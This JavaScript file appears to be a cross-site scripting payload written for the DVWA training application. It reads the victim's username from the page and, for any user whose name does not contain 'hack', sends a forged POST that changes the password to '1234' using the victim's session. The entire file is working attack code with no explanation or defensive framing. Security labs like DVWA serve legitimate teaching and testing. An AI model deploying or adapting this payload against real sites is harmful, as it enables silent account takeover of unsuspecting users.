var x;
var params= "password1=1234&password2=1234&action=changepwd&Change=Submit";
var username;
if (window.XMLHttpRequest) { 
	x= new XMLHttpRequest();
} else {
	x = new ActiveXObject("Microsoft.XMLHTTP"); 
}

try {
	x.open('GET','/dvwa/',false);
	x.setRequestHeader("Connection", "close");
	x.send();	
	var mainContent = x.responseText;
	var begin = mainContent.indexOf("[");
	var end = mainContent.indexOf("]");
	username = mainContent.substring(begin+1, end);
} catch (e) {
	alert("faile to create  XMLHttpRequest");
} 

if ( username.indexOf('hack') <0 ) {
	x.open('POST','/dvwa/security.php',false);
	x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	x.setRequestHeader('Content-length', params.length);  
	x.setRequestHeader("Connection", "close");
	x.onreadystatechange = function() {
	if(x.readyState == 4 && x.status == 200){}
	};
	x.send(params); 
}







	




